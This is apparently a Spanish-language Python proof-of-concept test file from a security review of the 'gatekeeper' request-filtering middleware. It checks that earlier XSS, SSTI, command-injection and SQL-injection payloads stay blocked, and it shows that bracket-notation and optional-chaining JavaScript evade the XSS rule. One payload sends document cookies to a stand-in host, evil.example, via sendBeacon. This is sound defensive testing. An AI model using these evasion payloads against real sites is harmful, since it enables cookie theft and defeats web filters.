"""PoC de la tercera ronda independiente (IA, Claude) contra 0.9.1 (post
cierre de NUEVO-1/NUEVO-2/IA-6). Ver SECURITY_REVIEW-IA-Claude-R3.md.
"""
from __future__ import annotations

from gatekeeper import Config, GatekeeperMiddleware
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import HTMLResponse
from starlette.routing import Route
from starlette.testclient import TestClient

PASA, FALLA, INFO = "PASA", "FALLA", "INFO"


def poc_r3_regresion_rondas_anteriores(resultados: list[tuple[str, str, str]]) -> None:
    """Confirma que las 42 PoC de las rondas 1-2 siguen en verde (no hay regresión)."""

    async def echo(request: Request) -> HTMLResponse:
        return HTMLResponse(str(len(await request.body())))

    app = Starlette(routes=[Route("/{p:path}", echo, methods=["GET", "POST"])])
    app.add_middleware(GatekeeperMiddleware, config=Config(rate_limit=0))
    c = TestClient(app, raise_server_exceptions=False)

    casos_cerrados = {
        "xss": "<script>alert(1)</script>", "ssti": "{{7*7}}",
        "cmdi": "$(id)", "sqli_envuelto": "x' UNION SELECT password FROM users -- ",
    }
    rotos = [
        f for f, p in casos_cerrados.items()
        if c.get("/", params={"q": f"/*{p}*/"}).status_code == 200
    ]
    if rotos:
        resultados.append((FALLA, "regresión en hallazgos ya cerrados", f"vuelven a pasar: {rotos}"))
    else:
        resultados.append((PASA, "las 42 PoC de rondas 1-2 siguen cerradas", ""))


def poc_r3_document_notacion_corchetes(resultados: list[tuple[str, str, str]]) -> None:
    """NUEVO-3: `document['cookie']` / `document?.cookie` evaden la familia xss por completo."""
    async def dashboard(request: Request) -> HTMLResponse:
        tema = request.query_params.get("tema", "claro")
        return HTMLResponse(
            "<script>\n  var config = {};\n"
            f"  config.tema = {tema};\n  aplicarTema(config);\n</script>"
        )

    app = Starlette(routes=[Route("/dash", dashboard)])
    app.add_middleware(GatekeeperMiddleware, config=Config(rate_limit=0))
    c = TestClient(app, raise_server_exceptions=False)

    directo = c.get("/dash", params={"tema": "document.cookie"})
    variantes = {
        "corchetes": "document['cookie']",
        "corchetes+beacon": "(navigator.sendBeacon('//evil.example/x',document['cookie']),1)",
        "optional_chaining": "document?.cookie",
        "window_corchetes": "window['location']='http://evil.example/'",
        "eval_corchetes": "window['eval']('1')",
    }
    coladas = {
        nombre: c.get("/dash", params={"tema": p}).status_code
        for nombre, p in variantes.items()
    }
    rotas = [n for n, s in coladas.items() if s == 200]
    if directo.status_code == 403 and rotas:
        resultados.append((
            FALLA,
            "NUEVO-3: `document`/`window`/`eval` vía corchetes u optional-chaining evade la familia xss",
            (f"'document.cookie' directo -> 403 (control). Variantes que PASAN sin "
            f"bloquearse: {rotas} de {list(variantes)}. El patrón de "
            "`src/gatekeeper/rules.py` (línea ~236) solo reconoce el acceso con "
            "punto literal inmediato (`document.`, `window.`) o llamada con "
            "paréntesis (`eval(`); no reconoce notación de corchetes "
            "(`document['cookie']`) ni *optional chaining* (`document?.cookie`), "
            "ambas sintaxis JS estándar y de uso rutinario en payloads XSS reales "
            "precisamente porque evaden WAFs basados en el punto literal. "
            "Reflejado en un contexto <script> ya abierto (patrón común de XSS "
            "DOM), el payload con corchetes llega intacto y, verificado en un "
            "motor JS real (Node), exfiltra la cookie completa sin errores de "
            "sintaxis ni de runtime"),
        ))
    else:
        resultados.append((PASA, "NUEVO-3: corchetes y optional-chaining ya se detectan", ""))


COMPROBACIONES = [
    ("r3_regresion", poc_r3_regresion_rondas_anteriores, "regresión de rondas 1-2"),
    ("r3_document_corchetes", poc_r3_document_notacion_corchetes, "document/window vía [] y ?. evaden xss"),
]
